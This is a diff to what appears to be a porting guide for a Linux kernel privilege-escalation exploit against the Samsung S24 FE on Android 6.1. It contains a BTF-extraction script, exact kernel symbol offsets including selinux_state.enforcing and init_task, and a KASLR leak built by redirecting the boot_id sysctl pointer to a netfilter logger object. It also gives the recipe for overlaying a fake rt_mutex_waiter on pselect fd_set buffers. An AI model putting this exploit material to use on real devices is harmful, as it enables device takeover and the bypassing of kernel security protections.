@@ -105,13 +105,78 @@ vmlinux-to-elf kernel vmlinux.elf
 llvm-nm --numeric-sort vmlinux.elf > vmlinux.nm
 ```
 
-This kernel contains raw BTF at file interval
-`[0x188B1A8, 0x1E423C8)`. Save that interval as `vmlinux.btf`, then dump C
-layouts:
+`pahole` expects an ELF container and does not extract a standalone BTF blob
+from a raw ARM64 Image. A raw BTF header starts with the 16-bit magic
+`0xeb9f`. These Samsung arm64 Images are little-endian, so the expected first
+eight bytes are:
+
+```text
+9f eb 01 00 18 00 00 00
+```
+
+They encode `magic=0xeb9f`, `version=1`, `flags=0`, and `hdr_len=24`. Do not
+accept the four-byte prefix alone: validate the complete header, section
+bounds, and the required NUL byte at the start of the string section. This
+extractor performs those checks and refuses ambiguous Images:
+
+The corresponding big-endian magic bytes would be `eb 9f`; they are not the
+encoding used by these targets.
+
+```python
+from pathlib import Path
+import struct
+
+image = Path("kernel").read_bytes()
+prefix = b"\x9f\xeb\x01\x00"
+candidates = []
+cursor = 0
+
+while True:
+    start = image.find(prefix, cursor)
+    if start < 0:
+        break
+    cursor = start + 1
+
+    if start + 24 > len(image):
+        continue
+
+    header = struct.unpack_from("<HBBIIIII", image, start)
+    magic, version, flags, header_len, type_off, type_len, str_off, str_len = header
+    if magic != 0xEB9F or version != 1 or flags != 0 or header_len < 24:
+        continue
+
+    payload_len = max(type_off + type_len, str_off + str_len)
+    end = start + header_len + payload_len
+    string_start = start + header_len + str_off
+    if end > len(image) or string_start >= end or image[string_start] != 0:
+        continue
+
+    candidates.append((start, end))
+
+if len(candidates) != 1:
+    raise SystemExit(f"expected one raw BTF blob, found: {candidates}")
+
+start, end = candidates[0]
+Path("vmlinux.btf").write_bytes(image[start:end])
+print(f"raw BTF: [0x{start:x}, 0x{end:x}) ({end - start} bytes)")
+```
+
+For this firmware, the validated interval is
+`[0x188B1A8, 0x1E423C8)`. BTF `type_off` and `str_off` are relative to the end
+of the header, not the beginning of the file. Keep both dump formats:
 
 ```sh
+bpftool btf dump file vmlinux.btf format raw > vmlinux-btf.raw
 bpftool btf dump file vmlinux.btf format c > vmlinux-btf.h
 ```
+
+Use `format raw` to derive exact structure sizes, member `bits_offset` values,
+and bitfield widths. Convert a byte-aligned member with
+`byte_offset = bits_offset / 8`; reject non-byte-aligned members instead of
+silently rounding them. `format c` is only a readable declaration view and is
+not the source of the numeric offsets recorded below. The raw BTF header format
+is documented in the
+[Linux BTF specification](https://www.kernel.org/doc/html/v5.15/bpf/btf.html).
 
 The recovered ELF base for this 6.1 image is `0xffffffc008000000`.
 
@@ -132,20 +197,42 @@ Required S24 FE symbol offsets from that base:
 | `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x00d38a5c` |
 | `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x0121dbd0` |
 | `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x013d9d48` |
+| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `"nfnetlink_log"` string referenced by `nfulnl_logger.name` | `0x016dd0af` |
 | `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x017a7a18` |
 | `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x022eae58` |
-| logger array | `loggers` | `0x022f2950` |
-| `SLIDE_LOGGERS_0_1_OFF` | first qword of `nfulnl_logger` object | `0x022f2a08` |
+| logger array | distinct `loggers[NFPROTO_NUMPROTO][NF_LOG_TYPE_MAX]` object | `0x022f2950` |
+| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` object | `0x022f2a08` |
 | `INIT_TASK_OFF` | `init_task` | `0x022ff800` |
 | `ASHMEM_MISC_FOPS_OFF` | `ashmem_misc + offsetof(miscdevice, fops)` | `0x02484970` |
 | `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x02515cc0` |
 | `SELINUX_ENFORCING_OFF` | `selinux_state.enforcing` | `0x025ea478` |
-| boot-id pointer | unique qword to boot-id data | `0x0243ef78` |
-| `SLIDE_SYSCTL_BOOTID_OFF` | `sysctl_bootid` | `0x026d1b60` |
+| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `.data` pointer slot in the `random_table[]` entry named `boot_id` | `0x0243ef78` |
+| `SLIDE_SYSCTL_BOOTID_OFF` | actual `sysctl_bootid` UUID storage | `0x026d1b60` |
 
 `ASHMEM_MISC_FOPS_OFF` is not a symbol. The symbolized ELF exposes
 `ashmem_misc`; BTF gives `offsetof(struct miscdevice, fops) == 0x10`, so the
 final offset is `ashmem_misc + 0x10`.
+
+The netfilter and boot-ID values have distinct roles and must not be collapsed
+into a single “logger” or “boot-id” offset:
+
+- `SLIDE_NFULNL_LOGGER_OBJECT_OFF` is the address of the complete
+  `struct nf_logger nfulnl_logger`. Its first qword is the `name` pointer.
+- `SLIDE_NFULNL_LOGGER_NAME_OFF` is that first qword's target, the
+  `"nfnetlink_log"` string. The leak reads the first qword and subtracts this
+  image offset to recover the text base.
+- The global `loggers[][]` registry is a separate object. It is useful for
+  cross-checking symbols but is not either macro above.
+- `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` is the writable `.data` pointer
+  field of the `boot_id` sysctl table entry in `drivers/char/random.c`. The
+  exploit temporarily changes this pointer to the logger object so that
+  `/proc/sys/kernel/random/boot_id` reads the oracle, then restores it to
+  `SLIDE_SYSCTL_BOOTID_OFF`, the actual `sysctl_bootid` storage.
+
+These names follow the actual [`struct nf_logger`](https://android.googlesource.com/kernel/common/+/158eae71734679b43e8731c48eec269746118385/include/net/netfilter/nf_log.h),
+[`nfulnl_logger`](https://android.googlesource.com/kernel/common.git/+/0793d39ec8bab2b2255e3a288894c39e88ce5a75/net/netfilter/nfnetlink_log.c),
+and [`random_table[]`](https://android.googlesource.com/kernel/common/+/3b3807ea9f42a0e99c2a27eb555a2648915b6aa0/drivers/char/random.c)
+definitions.
 
 Required layout values must come from the target BTF, not another device. The
 S24 FE values include:
@@ -201,12 +288,73 @@ blr  x19
 
 ## 5. Derive slide data and P0 fingerprints
 
-The target trace worker callsite is `0x000dbd9c`. The Android 6.1 trace enum
-ends at 20, and `sched_blocked_reason` is the 86th registered event after that
-base, producing runtime event ID `106`.
+### Trace event ID and worker return address
 
-The pselect syscall stack shape was disassembled on both target kernels; the
-S24 FE needs no extra word shift:
+`SLIDE_TRACEFS_EVENT_ID` is the runtime ID of the
+`sched:sched_blocked_reason` event. On a running target, read the authoritative
+value directly:
+
+```sh
+cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id
+```
+
+For an offline port, first inspect the target's `enum trace_type` in
+`kernel/trace/trace.h`. `__TRACE_LAST_TYPE` is the first dynamically assigned
+event ID; it is `20` in this Android 6.1 kernel. During boot,
+`register_trace_event()` starts `next_event_type` at `__TRACE_LAST_TYPE` and
+increments it in linker registration order. With symbols recovered, calculate:
+
+```text
+event_index = (__event_sched_blocked_reason - __start_ftrace_events) / 8
+event_id = __TRACE_LAST_TYPE + event_index
+```
+
+`event_index` is zero-based. It is `86` here, therefore the event ID is
+`20 + 86 = 106`. Do not describe this as the “86th event” without saying that
+it is zero-based, and do not copy either number across kernel branches. The
+assignment is visible in Android's
+[`trace_output.c`](https://android.googlesource.com/kernel/common/+/refs/heads/android14-6.1/kernel/trace/trace_output.c)
+and the static/dynamic boundary in
+[`trace.h`](https://android.googlesource.com/kernel/common/+/refs/heads/android14-6.1/kernel/trace/trace.h).
+
+The event's `caller` field is produced by `__get_wchan(tsk)`. For an idle
+kworker blocked inside `worker_thread`, the saved return PC is the instruction
+immediately after the `bl schedule` in that function. Derive the macro from the
+target ELF, not from the address of `schedule` itself:
+
+```sh
+llvm-nm --numeric-sort vmlinux.elf | grep ' worker_thread$'
+llvm-objdump --disassemble-symbols=worker_thread vmlinux.elf
+```
+
+Find the blocking `bl schedule`, take the following instruction address, then
+subtract `KIMAGE_TEXT_BASE`. The result for this target is
+`SLIDE_TRACEFS_WORKER_CALLER_OFF = 0x000dbd9c`. This matches the
+[`sched_blocked_reason` tracepoint](https://android.googlesource.com/kernel/common/+/refs/heads/android14-6.1/include/trace/events/sched.h)
+and the blocking call in
+[`worker_thread`](https://android.googlesource.com/kernel/common/+/refs/heads/android14-6.1/kernel/workqueue.c).
+After boot, enable the event and verify that every observed kworker caller
+minus this unslid address is 64-KiB aligned and falls in the target P0 slide
+range before accepting the value.
+
+### pselect word shift
+
+The payload treats the three userspace `fd_set` buffers as one logical array of
+64-bit words in this order: read set, write set, exception set.
+`SLIDE_PSELECT_WORD_SHIFT` is the number of leading qwords skipped in that
+logical array before fake `rt_mutex_waiter` word zero. It is a qword count, not
+a byte count or kernel address:
+
+```text
+global_fdset_word = SLIDE_PSELECT_WORD_SHIFT + waiter_word
+```
+
+Derive it from the target `pselect6`/`do_pselect` disassembly and stack layout:
+identify which copied fd-set qword overlaps qword zero of the reclaimed waiter,
+then count the preceding 64-bit words in read/write/exception-set order. Check
+that all waiter members land at their target BTF raw offsets. A value of zero
+means waiter qword zero overlaps the first logical fd-set qword; it is not a
+portable default. The S24 FE target was checked with no leading qwords:
 
 ```c
 #define SLIDE_TRACEFS_EVENT_ID 106
